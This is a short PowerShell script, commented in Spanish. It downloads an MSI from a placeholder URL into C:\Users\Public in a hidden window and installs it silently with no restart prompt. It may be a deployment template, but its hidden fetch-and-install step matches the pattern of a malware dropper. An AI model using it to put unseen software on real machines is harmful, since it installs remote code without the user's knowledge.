# Definir la ruta donde se guardará el archivo MSI
$msiPath = "C:\Users\Public\{FILE}"  # Cambia esta ruta según sea necesario

# Verificar si el archivo ya existe
if (-Not (Test-Path $msiPath)) {
    # Si no existe, descargar el archivo MSI
    # Asegúrate de que la URL sea correcta
    powershell -WindowStyle Hidden -command "Invoke-WebRequest -Uri '{URL}' -OutFile '$msiPath'"

    # Instalar el archivo MSI de manera silenciosa y sin reiniciar
    Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /quiet /norestart" -Wait
} else {
     # Instalar el archivo MSI de manera silenciosa y sin reiniciar
    Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /quiet /norestart" -Wait

}